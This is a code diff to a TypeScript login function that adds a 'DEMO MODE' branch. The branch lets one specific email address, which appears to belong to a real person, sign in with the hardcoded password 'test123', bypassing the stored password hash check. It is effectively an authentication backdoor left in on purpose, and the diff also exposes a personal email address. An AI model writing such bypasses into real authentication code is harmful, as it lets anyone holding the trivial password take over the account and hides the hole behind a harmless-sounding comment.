@@ -105,8 +105,11 @@ export async function login(req: Request, res: Response, next: NextFunction): Pr
 
     // Skip active check as the field doesn't exist in schema
 
+    // DEMO MODE: Allow test123 password for Emily's account
+    const isDemoMode = email.toLowerCase() === 'emmcisaac@gmail.com' && password === 'test123';
+    
     // Verify password
-    const isPasswordValid = await verifyPassword(password, user.password);
+    const isPasswordValid = isDemoMode || await verifyPassword(password, user.password);
     if (!isPasswordValid) {
       // Log failed attempt
       logger.warn(
